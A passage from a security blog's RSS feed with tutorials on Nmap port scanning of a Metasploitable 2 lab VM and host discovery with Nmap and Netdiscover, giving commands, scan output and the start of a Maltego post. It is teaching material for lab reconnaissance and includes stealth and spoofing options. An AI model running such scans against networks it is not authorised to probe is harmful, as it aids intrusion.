  --proxies &amp;lt;url1,[url2],...&amp;gt;: Relay connections through HTTP/SOCKS4 proxies
  --data &amp;lt;hex string&amp;gt;: Append a custom payload to sent packets
  --data-string &amp;lt;string&amp;gt;: Append a custom ASCII string to sent packets
  --data-length &amp;lt;num&amp;gt;: Append random data to sent packets
  --ip-options &amp;lt;options&amp;gt;: Send packets with specified ip options
  --ttl &amp;lt;val&amp;gt;: Set IP time-to-live field
  --spoof-mac &amp;lt;mac address/prefix/vendor name&amp;gt;: Spoof your MAC address
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
OUTPUT:
  -oN/-oX/-oS/-oG &amp;lt;file&amp;gt;: Output scan in normal, XML, s|&amp;lt;rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA &amp;lt;basename&amp;gt;: Output in the three major formats at once
  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  --reason: Display the reason a port is in a particular state
  --open: Only show open (or possibly open) ports
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --append-output: Append to rather than clobber specified output files
  --resume &amp;lt;filename&amp;gt;: Resume an aborted scan
  --stylesheet &amp;lt;path/URL&amp;gt;: XSL stylesheet to transform XML output to HTML
  --webxml: Reference stylesheet from Nmap.Org for more portable XML
  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
MISC:
  -6: Enable IPv6 scanning
  -A: Enable OS detection, version detection, script scanning, and traceroute
  --datadir &amp;lt;dirname&amp;gt;: Specify custom Nmap data file location
  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  --unprivileged: Assume the user lacks raw socket privileges
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Even if we will not go through all of them, we will analyze the most useful ones.&lt;/p&gt;

&lt;p&gt;The first thing we need to know to start a scan is the IP address of the target host. We could easily acquire that by simply logging into the just launched Metasploitable VM and then using &lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; command, but, since we want to mimic the actions of a real attacker that has no direct access to the machine, we have to move in a different way.&lt;br /&gt;
Remembering the previous post we can either use Nmap or Netdiscover for this matter: &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sn 192.168.1.0/24&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;netdiscover -r 192.168.1.0/24&lt;/code&gt; will do the job. We discover that Metasploitable 2 machine has IP address 192.168.1.100 (by default the IP address is assigned by DHCP, but we can set a static IP address modifying &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/network/interfaces&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Once we know the target IP address we can launch the port scanning attack. By default, if no option is selected, Nmap runs a TCP SYN Scan also known as Stealth Scan.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TCP 3-Way Handshake&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;To understand this type of scan it can be useful to refresh the TCP 3-way handshake theory which represents the way a TCP connection starts:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/port_scanning/3wayhandshake.png&quot;&gt;&lt;img src=&quot;/images/port_scanning/3wayhandshake.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;When a system A wants to establish a connection with another system B, A sends a SYN (Synchronize) packet to B; when B receives the message it sends back to A a SYN-ACK (Synchronize-Acknoledgement). Once A receives that signal, it sends to B an ACK. Finally B receives the ACK and the TCP socket connection is established.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TCP Scan&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A TCP SYN Scan works this way: system A, that represents our attacking machine, sends to the target system B the SYN and waits for the SYN-ACK. If B responds, which means the port is open, A does not send the final ACK. If A does not receive the SYN-ACK the port can be either closed or filtered (this can indicate the presence of a Firewall). In this way we have performed a TCP port scan without establishing a full connection with the target.&lt;br /&gt;
Resuming and detailing:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Open port: A sends SYN to B and B responds with SYN-ACK;&lt;/li&gt;
  &lt;li&gt;Closed port: A sends SYN to B and B responds with RST-ACK (Reset-Acknoledgement);&lt;/li&gt;
  &lt;li&gt;Filtered port: A sends SYN to B, but does not receive a response or receives an ICMP port unreachable error message.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Even if this type of scan is the default one, we can set it up with the “-sS” parameter followed by the IP address of the target:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sS 192.168.1.100

Starting Nmap 7.30 ( https://nmap.org ) at 2016-10-22 20:07 CEST
Nmap scan report for 192.168.1.100
Host is up (0.00020s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 00:0C:29:59:72:BC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Nmap, if not specified differently, sets the scan to probe the most common 1000 ports and goes through them in a random way (“-r” option for scanning ports consecutively).
As we can see from the results, we have scanned 1000 ports in 0.20 seconds and 977 of them are reported as closed; for the opened ones, Nmap gives us information about the service that is running on them.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Traffic analysis with Wireshark&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can inspect Nmap SYN Scan activity with Wireshark by launching it and then running the port scan:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/port_scanning/wireshark_synscan.png&quot;&gt;&lt;img src=&quot;/images/port_scanning/wireshark_synscan.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In the above image it is clear the attacking machine probes target ports by sending SYN packets: for example, we can look at the packet number 21 which probes port 22 (SSH service) and receives a SYN-ACK at packet number 31 meaning the port is open. The ones highlighted in red are RST-ACK meaning that specific port is closed.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;A more aggressive port scan&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can add some parameters to acquire additional details about the version of services running on those open ports (“-sV”) and to identify the Operating System (“-O”). We can also specify we want to scan not only the top 1000 ports, but all of them (“-p 1-65535”). Finally we can set up a time aggressive scan with “-T4”, since we do not care of being detected in a testing lab environment (the less the number after “T” the bigger the time between the probes).
Of course, because this is a more complex scan, it will take more time to execute w.r.t the previous one:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sV -O -T4 -p 1-65535 192.168.1.100

Starting Nmap 7.30 ( https://nmap.org ) at 2016-10-22 20:10 CEST
Nmap scan report for 192.168.1.100
Host is up (0.00017s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
1099/tcp  open  rmiregistry GNU Classpath grmiregistry
1524/tcp  open  shell       Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         Unreal ircd
6697/tcp  open  irc         Unreal ircd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
43534/tcp open  status      1 (RPC #100024)
45768/tcp open  nlockmgr    1-4 (RPC #100021)
52690/tcp open  mountd      1-3 (RPC #100005)
58138/tcp open  unknown
MAC Address: 00:0C:29:59:72:BC (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.14 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As reported above, we have details about services version: for example, we now know that the ftp server running on Metasploitable 2 is vsftpd (Very Secure FTPD) version 2.3.4.
Moreover we got the Operating System which is Linux and the Kernel version detected as 2.6.x (between 2.6.9 and 2.6.33).&lt;br /&gt;
Keep in mind that an aggressive scan is more likely to be detected and there is also the possibility that it brings down the service that runs on the corresponding scanned port.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;UDP Scan&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Until now we have performed TCP port scan. UDP scan is really different since UDP is a connectionless protocol. It can happen that even if a UDP port is open it might not respond to any received UDP packet. During a UDP scan the attacker machine sends a UDP packet to the target port: if the port is open the attacker machine receives a response; if the port is closed Nmap receives an ICMP port unreachable message. If the attacker machine does not receive any response there are two possibilities: the port is open but the service is not responding to Nmap probes or the traffic is filtered due to the presence of a Firewall.&lt;/p&gt;

&lt;p&gt;A UDP scan can be launched with the option “-sU”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sU 192.168.1.100

Starting Nmap 7.30 ( https://nmap.org ) at 2016-10-22 20:14 CEST
Nmap scan report for --- (192.168.1.100)
Host is up (0.00021s latency).
Not shown: 994 closed ports
PORT     STATE         SERVICE
53/udp   open          domain
69/udp   open|filtered tftp
111/udp  open          rpcbind
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
2049/udp open          nfs
MAC Address: 00:0C:29:59:72:BC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1082.85 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As reported, we have scanned 1000 ports and 994 of them are identified as closed. As stated before, when Nmap does not receive any response it classifies the port either as open or filtered. Moreover UDP scan is time consuming: 1082.85 seconds, which are about 18 minutes.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Reporting&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;An interesting feature is the possibility to report results into different formats like XML. In particular, it is useful to convert XML results into HTML files, so they can be displayed in your favourite Web Browser.&lt;br /&gt;
The following command generates the XML report, process it and gives as output the HTML file:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap 192.168.1.100 -oX metasploitable_scan.xml &amp;amp;&amp;amp; xsltproc metasploitable_scan.xml -o metasploitable_report.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;And this is the HTML report:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/port_scanning/nmap_metasploitable_report.png&quot;&gt;&lt;img src=&quot;/images/port_scanning/nmap_metasploitable_report.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusions&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We have seen how Nmap can perform both TCP and UDP port scan; it is a really good tool to identify open ports on the target system and which services are running on them. We have also seen how it is possible to discover target services versions and O.S. through a more agressive scan. The results reporting capability has been showed with an example of HTML report.&lt;br /&gt;
There are a lot of other interesting features inside this tool and we will take a look at them in the next lab sessions.&lt;/p&gt;
</description>
        <pubDate>Sun, 23 Oct 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/10/23/port-scanning-with-nmap.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/10/23/port-scanning-with-nmap.html</guid>
        
        <category>Reconnaissance</category>
        
        <category>Port scanning</category>
        
        <category>Nmap</category>
        
        <category>TCP 3-way handshake</category>
        
        <category>TCP scan</category>
        
        <category>UDP scan</category>
        
        <category>Metasploitable 2</category>
        
        <category>Network packet analysis</category>
        
        <category>Wireshark</category>
        
        
      </item>
    
      <item>
        <title>Network Discovery with Nmap and Netdiscover</title>
        <description>&lt;p&gt;Network discovery represents an important phase in the Information Gathering activity: it is the process of identifying live hosts on the network. This means that its purpose is not to find all possible informations about the targets (like open ports or vulnerabilities), but just to understand their logical location inside the network. Mapping targets is useful to model network infrastructure.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Nmap is the most famous and complete tool for network discovery and scanning: it is considered the “Swiss army knife” of network Security tools and it can be used to perform a large variety of tasks.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If you are using Kali Linux, Nmap is already part of your arsenal. Otherwise you can install it from package repositories by using &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install nmap&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;yum install nmap&lt;/code&gt; or similar commands depending on your Linux distro. You can even download the latest release from &lt;a href=&quot;https://nmap.org/download.html&quot;&gt;https://nmap.org/download.html&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Kali Linux, Nmap can be started by navigating in the applications menu by clicking on &lt;em&gt;Applications &amp;gt; Information Gathering &amp;gt; nmap&lt;/em&gt; like shown in the following image:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/nmap_start.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/nmap_start.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Same thing can be done by clicking on the “Show application” menu:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/nmap_start2.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/nmap_start2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another possibility is launching it by simply opening the Terminal and typing &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt;. In any case, we are prompted with tool version and usage instructions:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap
Nmap 7.25BETA2 ( https://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL &amp;lt;inputfilename&amp;gt;: Input from list of hosts/networks
  -iR &amp;lt;num hosts&amp;gt;: Choose random targets
  --exclude &amp;lt;host1[,host2][,host3],...&amp;gt;: Exclude hosts/networks
  --excludefile &amp;lt;exclude_file&amp;gt;: Exclude list from file
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers &amp;lt;serv1[,serv2],...&amp;gt;: Specify custom DNS servers
  --system-dns: Use OS&#39;s DNS resolver
  --traceroute: Trace hop path to each host
...............................................................................
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;There is a huge list of parameters through which it is possible to perform a great quantity of activities: host discovery, port scanning, service/version detection, OS detection, Firewall/IDS evasion and spoofing, running scripts using Nmap Scripting Engine (NSE) and so on (above only HOST DISCOVERY options are reported).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Host discovery&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this article, we focus on host discovery techniques.
We can list hosts belonging to a certain subnet by setting the “-sL” switch; this can be helpful to check the IP addresses belonging to that subnet. The range can be expressed, for example, using the Classless Inter-Domain Routing (CIDR) notation:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sL 192.168.1.0/24

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-18 15:37 CEST
Nmap scan report for 192.168.1.0
Nmap scan report for 192.168.1.1
Nmap scan report for 192.168.1.2
Nmap scan report for 192.168.1.3
.....................................................................
Nmap scan report for 192.168.1.253
Nmap scan report for 192.168.1.254
Nmap scan report for 192.168.1.255
Nmap done: 256 IP addresses (0 hosts up) scanned in 4.26 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Keep in mind this does not send any packet to the hosts: it only makes a list based on the specified network; Nmap by default always tries to do a reverse DNS resolution on the hosts to discover their names.&lt;/p&gt;

&lt;p&gt;Instead, if we want to perform a network discovery, we can use the “-sn” switch; this option takes as input an IP address or a range and checks if a host is online or not by sending Address Resolution Protocol (ARP) requests or Internet Control Message Protocol (ICMP) requests depending on the target subnet location (local or remote).&lt;br /&gt;
In fact referring to the ISO/OSI stack model, since ARP is a layer 2 protocol, it cannot discover remote systems due to its non routable nature; in that case Nmap automatically switches to ICMP requests which are instead layer 3.&lt;br /&gt;
Everytime it is possible, i.e. for hosts on the local subnet, it is better to use ARP discovery since it is faster and highly relayable (ICMP requests can be filtered by Firewalls).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sn 192.168.1.0/24

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-18 16:25 CEST
Nmap scan report for 192.168.1.1
Host is up (0.0011s latency).
MAC Address: 00:11:22:33:44:55 (Router manufacturer)
Nmap scan report for 192.168.1.100
Host is up (0.00015s latency).
MAC Address: 00:0C:29:59:72:BC (VMware)
Nmap scan report for 192.168.1.201
Host is up (0.00012s latency).
MAC Address: 00:0C:29:A2:56:2B (VMware)
Nmap scan report for 192.168.1.10
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.06 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Of course this activity is more intrusive than just listing hosts, but it is a necessary step to understand which machines are up or not.&lt;br /&gt;
We can see that in the network defined by the range 192.168.1.0-255 there are 4 hosts that responded to our ARP requests. For every host discovered it is reported its Media Access Control (MAC) address. This value is made by 6 couples of numbers separated by the colon symbol and represents the host in a unique way since refers to the machine network card (the first three couples indicate the manufacturer).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Analizying network packets&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can check the discovery activity with a network packet analyzer/sniffer like Wireshark: in Kali, &lt;em&gt;Applications &amp;gt; Sniffing &amp;amp; Spoofing &amp;gt; wireshark&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Once the tool is launched we need to set the network interface we want to listen on, in this case &lt;em&gt;eth0&lt;/em&gt;; this can be done by clicking on &lt;em&gt;Capture &amp;gt; Options&lt;/em&gt; and then selecting the interface:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/wireshark1.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/wireshark1.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Clicking on the Start button launches the packets capture. If now we restart the above Nmap scan we can check its activity in Wireshark main window. The following image shows, as expected, broadcast ARP requests made to the entire range 192.168.1.0-255 by the Kali machine which has IP address 192.168.1.10:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/wireshark2.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/wireshark2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If a machine has the requested IP address, it will respond declaring its MAC address. Data collected in this way are saved in the ARP cache, which is nothing more than a table containing the list of IP addresses with their associated MAC address.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Netdiscover&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Netdiscover is my preferred tool for local network discovery: it is pretty fast and offers the possibility to perform both active and passive ARP reconnaissance.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If you are using Kali Linux, you have it already available. Otherwise, if for example you are using Ubuntu, you can install it from package repositories by using &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install netdiscover&lt;/code&gt; . You can even download the latest release from &lt;a href=&quot;https://sourceforge.net/projects/netdiscover/&quot;&gt;https://sourceforge.net/projects/netdiscover/&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Kali Linux, Nmap can be started by navigating in the applications menu by clicking on &lt;em&gt;Applications &amp;gt; Information Gathering &amp;gt; netdiscover&lt;/em&gt; like shown in the following image:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/netdicover_start.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/netdiscover_start.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Same thing can be done by clicking on the “Show application” menu:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/netdiscover_start2.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/netdiscover_start2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This opens up a Terminal with usage instructions:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Netdiscover 0.3-pre-beta7 [Active/passive arp reconnaissance tool]
Written by: Jaime Penalba &amp;lt;jpenalbae@gmail.com&amp;gt;

Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-s time] [-n node] [-c count] [-f] [-d] [-S] [-P] [-c]
  -i device: your network device
  -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8
  -l file: scan the list of ranges contained into the given file
  -p passive mode: do not send anything, only sniff
  -m file: scan the list of known MACs and host names
  -F filter: Customize pcap filter expression (default: &quot;arp&quot;)
  -s time: time to sleep between each arp request (milliseconds)
  -n node: last ip octet used for scanning (from 2 to 253)
  -c count: number of times to send each arp reques (for nets with packet loss)
  -f enable fastmode scan, saves a lot of time, recommended for auto
  -d ignore home config files for autoscan and fast mode
  -S enable sleep time supression between each request (hardcore mode)
  -P print results in a format suitable for parsing by another program
  -N Do not print header. Only valid when -P is enabled.
  -L in parsable output mode (-P), continue listening after the active scan is completed

If -r, -l or -p are not enabled, netdiscover will scan for common lan addresses.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;They are pretty explanatory; an example of active ARP reconnaissance is this one:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# netdiscover -r 192.168.1.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname 
 -----------------------------------------------------------------------------
 192.168.1.1     00:11:22:33:44:55      1      60  Router Manufacturer
 192.168.1.100   00:0c:29:59:72:bc      1      60  VMware, Inc.
 192.168.1.200   00:0c:29:3a:cb:5b      1      60  VMware, Inc.
 192.168.1.201   00:0c:29:a2:56:2b      1      60  VMware, Inc.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As reported the tool scanned the subnet 192.168.1.0/24 by sendind ARP request on the network and finding out the same four hosts seen before.&lt;/p&gt;

&lt;p&gt;If we want to maintain a low profile to avoid getting caught, we can set up a passive ARP discovery; in this case we just sit sniffing the network traffic:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# netdiscover -p
 Currently scanning: (passive)   |   Screen View: Unique Hosts
 10 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 600
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.201   00:0c:29:a2:56:2b      5     300  VMware, Inc.
 192.168.1.1     00:11:22:33:44:55      2     120  Router Manufacturer
 192.168.1.200   00:0c:29:3a:cb:5b      1      60  VMware, Inc.
 192.168.1.100   00:0c:29:59:72:bc      2     120  VMware, Inc. 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Of course this will take longer w.r.t. the active scan, but it is difficult to detect since we are just listening for ARP requests and responses on the network made by other systems.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusions&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We have seen how to use Nmap and Netdiscover for discovering live hosts inside a network. They are both useful tools even if Nmap is better for a port scanning and service detection purpose (in a forthcoming article we will take a look at how it can be used to perform these tasks).&lt;/p&gt;
</description>
        <pubDate>Sun, 25 Sep 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/09/25/network-discovery-with-nmap-and-netdiscover.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/09/25/network-discovery-with-nmap-and-netdiscover.html</guid>
        
        <category>Information gathering</category>
        
        <category>Network discovery</category>
        
        <category>Nmap</category>
        
        <category>Netdiscover</category>
        
        <category>Network packet analysis</category>
        
        <category>Wireshark</category>
        
        
      </item>
    
      <item>
        <title>Open Source Intelligence with Maltego</title>
        <description>&lt;p&gt;Maltego is a visual link analysis and data mining tool and it is the most famous software for performing Open Source Intelligence. It provides a library of plugins, called “transforms”, which are used to execute queries on open sources in order to gather information about a certain target and display them on a nice graph. In fact, differently from the command line tools seen until now, Maltego has a Graphical User Interface through which the user performs his research and analyzes results returned on the graph.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;It is developed by Paterva which distributes three different versions: Maltego XL, Classic and CE.
We are interested in Maltego CE which stands for Community Edition: this is the non commercial version and it is available for everyone after a quick registration.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Before proceeding with the installation it is a good idea to register at this link: &lt;a href=&quot;https://www.paterva.com/web7/community/community.php&quot;&gt;https://www.paterva.com/web7/community/community.php&lt;/a&gt;. In fact, in order to use the software it is mandatory to have a Maltego account which is required at the startup of the application.&lt;/p&gt;

&lt;p&gt;If you are using Kali Linux, Maltego CE is already installed. Moreover you will find that Kali has its own custom version called Maltego Chlorine, which has been made on purpose for this distro.&lt;br /&gt;
Otherwise you can download the package from &lt;a href=&quot;https://www.paterva.com/web7/downloads.php#tab-3&quot;&gt;https://www.paterva.com/web7/downloads.php#tab-3&lt;/a&gt; and install it on your operating system (the software is available for Windows, Linux or Mac OSX).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Kali Linux, Maltego can be started by navigating in the applications menu by clicking on &lt;em&gt;Applications &amp;gt; Information Gathering &amp;gt; maltegoce&lt;/em&gt; like shown in the following image:&lt;/p&gt;

